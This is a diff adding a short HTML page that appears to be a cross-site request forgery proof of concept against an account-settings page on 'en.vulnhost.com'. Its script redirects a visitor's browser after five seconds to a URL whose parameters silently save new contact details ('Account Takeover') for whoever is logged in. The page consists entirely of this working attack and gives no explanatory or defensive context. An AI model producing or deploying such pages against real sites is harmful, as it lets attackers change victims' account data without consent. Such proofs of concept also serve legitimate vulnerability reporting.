@@ -1,0 +1,14 @@
+<html>
+<head>
+<script type="text/javascript">
+	var timer = null;
+function auto_reload()
+{
+	window.location = 'https://en.vulnhost.com/mycenter/settings/account.html?4-2.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=Account&lastName=Takeover&saveContact=1';
+}
+</script>
+<body>
+<!-- Reload page every 5 seconds. -->
+	 <body onload="timer = setTimeout('auto_reload()',5000);">
+</body>
+</html>
